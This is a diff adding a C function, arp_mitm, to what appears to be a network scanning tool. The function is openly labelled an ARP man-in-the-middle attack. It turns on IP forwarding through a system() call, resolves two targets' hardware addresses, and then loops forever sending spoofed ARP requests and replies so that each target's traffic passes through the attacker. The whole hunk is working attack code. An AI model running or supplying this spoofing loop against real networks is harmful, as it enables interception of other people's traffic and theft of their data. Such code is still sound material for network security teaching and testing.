@@ -282,3 +282,68 @@ int arp_scan(int sockfd, int ifindex, struct sockaddr_in *ipaddr, unsigned char 
 
 
 
+/* ARP man-in-the-middle attack.
+
+   sockfd: socket file descriptor
+   ifindex: index of the interface
+   ipaddr: local IP address
+   macaddr: local hardware address
+   target1_ip: IP address of the first target
+   target2_ip: IP address of the second target
+
+   Never returns, has to be killed by the user.
+ */
+int arp_mitm(int sockfd, int ifindex, struct sockaddr_in *ipaddr, unsigned char *macaddr, struct in_addr *target1_ip, struct in_addr *target2_ip)
+{
+
+  /* We build 2 pseudo-local IP addresses to impersonate both
+     targets */
+  struct sockaddr_in *ipaddr1 = malloc(sizeof(struct sockaddr_in));
+  struct sockaddr_in *ipaddr2 = malloc(sizeof(struct sockaddr_in));
+  ipaddr1->sin_family = AF_INET;
+  ipaddr1->sin_port = htons(5746);
+  ipaddr1->sin_addr = *target1_ip;
+  ipaddr2->sin_family = AF_INET;
+  ipaddr2->sin_port = htons(5746);
+  ipaddr2->sin_addr = *target2_ip;
+
+  /* ====================================================================== */
+  
+  /* Ensures IP forwarding is enabled on Linux, in order to make he
+     attacker "transparent" to packets moving form target1 to
+     target2. This is not persistent on reboot. */
+  system("echo 1 > /proc/sys/net/ipv4/ip_forward");
+
+  /* We send normal requests to both targets in order to get their
+     hardware addresses.  */
+  send_arp_request(sockfd, ifindex, ipaddr, macaddr, *target1_ip);
+  struct ether_arp reply1;
+  listen_arp_frame(sockfd, &reply1);
+  unsigned char *macaddr1 = reply1.arp_sha;
+  printf("Target 1 hardware address: %02x:%02x:%02x:%02x:%02x:%02x\n",
+    	 macaddr1[0],macaddr1[1],macaddr1[2],
+    	 macaddr1[3],macaddr1[4],macaddr1[5]);
+
+  send_arp_request(sockfd, ifindex, ipaddr, macaddr, *target2_ip);
+  struct ether_arp reply2;
+  listen_arp_frame(sockfd, &reply2);
+  unsigned char *macaddr2 = reply2.arp_sha;
+  printf("Target 2 hardware address: %02x:%02x:%02x:%02x:%02x:%02x\n",
+    	 macaddr2[0],macaddr2[1],macaddr2[2],
+    	 macaddr2[3],macaddr2[4],macaddr2[5]);
+
+  /* We send ARP requests and replies to both targets, impersonating
+     the other. We use both requests and replies because some devices
+     (linux > 2.4.x for example) don't update their ARP cache on
+     unsolicited replies, but do on queries. */
+  while(1) {
+    send_arp_request(sockfd, ifindex, ipaddr1, macaddr, *target2_ip);
+    send_arp_reply(sockfd, ifindex, ipaddr1, macaddr, *target2_ip, macaddr2);
+    sleep(1);
+    send_arp_request(sockfd, ifindex, ipaddr2, macaddr, *target1_ip);
+    send_arp_reply(sockfd, ifindex, ipaddr2, macaddr, *target1_ip, macaddr1);
+    sleep(1);
+  }
+
+  return 0;
+}
